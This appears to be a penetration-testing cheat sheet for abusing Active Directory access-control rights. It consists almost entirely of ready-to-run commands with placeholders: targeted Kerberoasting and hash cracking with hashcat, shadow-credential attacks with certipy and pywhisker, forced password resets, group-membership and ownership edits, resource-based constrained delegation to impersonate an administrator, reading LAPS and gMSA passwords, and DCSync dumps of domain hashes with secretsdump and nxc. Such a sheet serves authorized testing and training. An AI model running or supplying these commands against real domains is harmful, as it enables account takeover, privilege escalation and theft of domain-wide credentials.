- [GenericWrite](#genericwrite)
- [GenericALL](#genericall)
- [ForceChangePassword](#forcechangepassword)
- [AddMember](#addmember)
- [WriteOwner](#writeowner)
- [AddKeyCredentialLink](#addkeycredentialLink)
- [ReadLAPSPassword](#readlapspassword)
- [ReadGMSAPassword](#readgmsapassword)
- [DCSync](#dcsync)
## GenericWrite
> Update object's attributes
### Targeted Kerberoasting
```
python targetedKerberoast.py -v -d <domain> -u <username> -p <password>
```

```
hashcat -m 13100 -a 0 <hash_file> rockyou.txt --force
```
### ShadowCredentials
```
certipy shadow auto -u username@domain -p <password> -account <target_username> -dc-ip <ip>
```
Using Kerberos
```
certipy shadow auto -username username@domain -p <password> -k -account <target_username> -target <dc>
```
## GenericALL
> Full rights to the object (add users to a group or reset user's password)
### Password Change
```
net rpc password <username> <new_password> -U <domain>/<username>%<hash> -S <dc> --pw-nt-hash
```
### Add user to a group
```
net rpc group addmem <target_group> <username> -U <domain>/<username> -S <dc>
```
### RBCD
```
rbcd.py -delegate-from '<machine_name>' -delegate-to '<target>' -dc-ip <ip> -action 'write' '<domain>/<username>:<password>'
```

```
getST.py -spn 'cifs/<dc>' -impersonate administrator -dc-ip <ip> '<domain>/<machine_name>:<password>'
```

```
export KRB5CCNAME=administrator.ccache
```
## ForceChangePassword
> Ability to change user's password
```
net rpc password <TargetUser> <new_password> -U "DOMAIN"/"ControlledUser"%"Password" -S <DomainController>
```

```
bloodyAD --host <ip> -d <dc> -u <username> -p <password> set password <target_userename> <new_password>
```

```
python rpcchangepwd.py <domain>/<username>:<password>@<ip> -newpass <new_password>
```
## AddMember
```
net rpc group addmem <target_group> <username> -U <domain>/<username> -S <dc>
```
## WriteOwner
> Change object owner to attacker controlled user take over the object
```
owneredit.py -action write -new-owner <username> -target <group_name> <domain>/<username>:<password>
```

```
dacledit.py -action 'write' -rights 'WriteMembers' -principal <username> -target-dn <dn> <domain>/<username>:<password>
```

```
bloodyAD.py -d <domain> -u <username> -p <password> --host <dc> add groupMember <target_group> <username>
```
## AddKeyCredentialLink
```
python3 pywhisker.py -d <domain> --dc-ip <ip> -u <username> -H :<hashes> --target <target_username> --action "add"
```

```
certipy shadow auto -username <username>@<domain> -hashes :<hashes> -account <target_username>
```
## ReadLAPSPassword
```
nxc smb <target> -u <username> -p <password> --laps
```
## ReadGMSAPassword
```
nxc ldap <target> -u <username> -p <password> --gmsa
```
## DCSync
```
secretsdump.py <dc> -k
```

```
nxc smb <domain> -u <username> -p <password> --ntds
```

```
nxc smb <domain> -k --use-kcache --ntds
```
# Resources
- https://www.thehacker.recipes/ad/movement/dacl/
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse
- https://mayfly277.github.io/posts/GOADv2-pwning-part11/
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
